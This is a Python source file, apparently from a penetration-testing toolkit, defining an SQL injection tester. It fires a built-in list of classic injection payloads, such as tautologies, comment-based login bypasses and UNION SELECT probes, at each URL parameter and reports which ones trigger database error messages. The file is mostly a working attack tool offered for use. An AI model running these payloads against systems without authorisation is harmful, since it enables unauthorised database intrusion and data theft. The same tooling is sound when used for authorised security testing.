"""SQL Injection Testing Tool"""
import requests
from typing import Dict, List, Any
from urllib.parse import urljoin, urlparse

from ...core.base_tool import BaseTool, ToolMetadata, ToolCategory
from ...core.logger import logger


class SQLInjector(BaseTool):
    """SQL Injection vulnerability detector"""
    
    def __init__(self):
        metadata = ToolMetadata(
            name="SQL Injection Tester",
            category=ToolCategory.WEB,
            version="1.0.0",
            author="AleoPantest",
            description="SQL injection vulnerability testing dengan berbagai payload",
            usage="sqli = SQLInjector(); sqli.run(url='http://target.com/page.php?id=1')",
            requirements=["requests"],
            tags=["web", "sql-injection", "vulnerability", "testing"]
        )
        super().__init__(metadata)
        
        # Common SQL injection payloads
        self.payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1 #",
            "' OR 1=1/*",
            "admin' --",
            "admin' #",
            "admin'/*",
            "' or 'a'='a",
            "') OR ('1'='1",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL, NULL--",
            "1' UNION SELECT NULL, NULL, NULL--",
        ]
    
    def validate_input(self, url: str, **kwargs) -> bool:
        """Validate input"""
        if not url:
            self.add_error("URL tidak boleh kosong")
            return False
        if not url.startswith(('http://', 'https://')):
            self.add_error("Invalid URL format")
            return False
        return True
    
    def test_parameter(self, url: str, param: str, value: str, timeout: int = 10) -> Dict[str, Any]:
        """Test single parameter for SQL injection"""
        results = {
            'parameter': param,
            'vulnerable': False,
            'payloads_tested': 0,
            'successful_payloads': []
        }
        
        try:
            # Test dengan payload
            for payload in self.payloads:
                results['payloads_tested'] += 1
                
                params = {param: payload}
                
                try:
                    response = requests.get(url, params=params, timeout=timeout)
                    
                    # Check untuk indikasi SQL error
                    error_indicators = [
                        'SQL syntax',
                        'mysql_fetch',
                        'Warning: MySQL',
                        'Unclosed quotation mark',
                        'SQL Server',
                        'ORA-',
                    ]
                    
                    for indicator in error_indicators:
                        if indicator.lower() in response.text.lower():
                            results['vulnerable'] = True
                            results['successful_payloads'].append({
                                'payload': payload,
                                'indicator': indicator
                            })
                            logger.warning(f"Potential SQL injection found with payload: {payload}")
                            break
                
                except requests.exceptions.RequestException as e:
                    logger.debug(f"Request error: {e}")
        
        except Exception as e:
            logger.error(f"Error testing parameter {param}: {e}")
        
        return results
    
    def run(self, url: str, parameter: str = None, timeout: int = 10, **kwargs):
        """Test URL for SQL injection"""
        if not self.validate_input(url, **kwargs):
            return
        
        self.is_running = True
        self.clear_results()
        
        try:
            logger.info(f"Testing {url} for SQL injection")
            
            parsed_url = urlparse(url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
            
            result = {
                'url': url,
                'vulnerable': False,
                'parameters': []
            }
            
            # Test specified parameter
            if parameter:
                param_result = self.test_parameter(base_url, parameter, '', timeout)
                result['parameters'].append(param_result)
                if param_result['vulnerable']:
                    result['vulnerable'] = True
            else:
                # Test all parameters from URL
                from urllib.parse import parse_qs
                params = parse_qs(parsed_url.query)
                
                for param in params.keys():
                    param_result = self.test_parameter(base_url, param, params[param][0], timeout)
                    result['parameters'].append(param_result)
                    if param_result['vulnerable']:
                        result['vulnerable'] = True
            
            self.add_result(result)
            logger.info(f"SQL injection test completed. Vulnerable: {result['vulnerable']}")
            return result
            
        except Exception as e:
            self.add_error(f"SQL injection test failed: {e}")
        finally:
            self.is_running = False
